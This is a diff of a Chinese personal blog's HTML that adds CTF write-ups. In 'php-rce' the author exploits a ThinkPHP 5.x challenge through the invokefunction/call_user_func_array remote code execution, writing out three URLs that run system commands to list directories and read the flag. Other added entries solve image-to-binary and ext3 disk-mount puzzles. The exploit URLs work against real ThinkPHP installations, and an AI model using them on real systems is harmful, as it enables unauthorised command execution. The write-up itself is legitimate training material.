@@ -152,6 +152,95 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-web-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/28/web-1/">web-1</a>
+    </h1>
+  
+
+        
+        <a href="/2021/01/28/web-1/" class="archive-article-date">
+  	<time datetime="2021-01-27T17:23:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <center>Web-高手进阶-攻防世界</center>
+
+<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php-rce"></a>php-rce</h2><p>由其页面信息可得其为<code>ThinkPHP 5.x</code>框架，又由题目名字显然其让我们利用CMS漏洞打入，直接msf搜索利用</p>
+<p><img src="/images/image-20210128012700939.png" alt="image-20210128012700939"></p>
+<p>设置好攻击载荷和RHOSTS以及LHOST等参数后，执行exploit，很奇怪，msf执行成功但是却并未回弹任何shell，有如下推测。</p>
+<p><img src="/images/image-20210128014220310.png" alt="image-20210128014220310"></p>
+<ul>
+<li>一是对方网页布置在一个docker里，有保护机制防止服务器被日穿</li>
+<li>二是我设置的LHOST并不是一个公网ip，很可能无法回弹shell</li>
+</ul>
+<p>可以用有公网ip的VPS部署msf试试来验证猜想（我也有，留待日后验证），回过头来解题，搜索该版本漏洞利用和对应payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br><span class="line">#当前目录</span><br><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20../../</span><br><span class="line">#上级目录，在上级一次发现了一个flag的目录，于是输入</span><br><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag</span><br></pre></td></tr></table></figure>
+<p>即可得到</p>
+<p><img src="/images/image-20210128015103215.png" alt="image-20210128015103215"></p>
+<hr>
+<p>未完待续。。。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/01/28/web-1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DC1靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -321,6 +410,10 @@
 <h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>打开压缩包给了一连串黑白黑白的.jpg图片，这里参考了一下别人思路，发现是二进制，不想手动输入，写了一个python脚本。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">white=<span class="built_in">open</span>(<span class="string">&quot;E:\\0.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()<span class="comment">#记录黑白的标志</span></span><br><span class="line">black=<span class="built_in">open</span>(<span class="string">&quot;E:\\1.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">    ans=<span class="built_in">open</span>(<span class="string">&quot;E:\\&#123;x&#125;.jpg&quot;</span>.<span class="built_in">format</span>(x=i),<span class="string">&quot;rb&quot;</span>).read()<span class="comment">#循环打开，注意此时也可以用另一种写法</span></span><br><span class="line">    <span class="comment">#ans=open(&quot;E:\\%a.jpg&quot;%i,&quot;rb&quot;).read()</span></span><br><span class="line">    <span class="keyword">if</span>(ans==white):   </span><br><span class="line">        result=result+<span class="string">&quot;0&quot;</span><span class="comment">#为白则字符补0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result=result+<span class="string">&quot;1&quot;</span><span class="comment">#为黑则字符补1</span></span><br><span class="line">str1=<span class="string">&quot;&quot;</span></span><br><span class="line">numb=<span class="built_in">len</span>(result)//<span class="number">8</span>  <span class="comment">#以8为分隔，记录位数，每隔8位为一个二进制表示的字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (numb):</span><br><span class="line">    str1=str1+<span class="built_in">chr</span>(<span class="built_in">int</span>(result[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))<span class="comment">#这里就用上了前天补的切片知识，将二进制每隔8位切片，先转为十进制int(xxx,2)再利用ASCII码对应的十进制直接，chr转换即可</span></span><br><span class="line">print(str1)</span><br></pre></td></tr></table></figure>
 <p>即可得出结果。</p>
+<h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>磁盘分析题目，在linux环境下运行，先使用<code>strings ext3ctf | grep flag</code>发现存在<code>flag.txt</code>文件，参考了linux相关命令，得知磁盘需挂载，如下命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount ext3ctf /mnt</span><br><span class="line">cd /mnt</span><br><span class="line">find . -name &quot;flag.txt&quot;</span><br></pre></td></tr></table></figure>
+<p>其中find的用法参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-find.html">我是链接</a></p>
+<p>该题也可通过<code>010editor</code>和<code>winhex</code>等工具打开，搜索<code>flag.txt</code>所在路径解压打开再base64解码可得。</p>
 <hr>
 <p>有些简单的misc并未记录，仅记录下有所收获的题目</p>
 <p>未完待续。。。</p>
@@ -1143,11 +1236,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Typora</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color2">Typora</a>
               </li>
              
               <li class="article-tag-list-item">
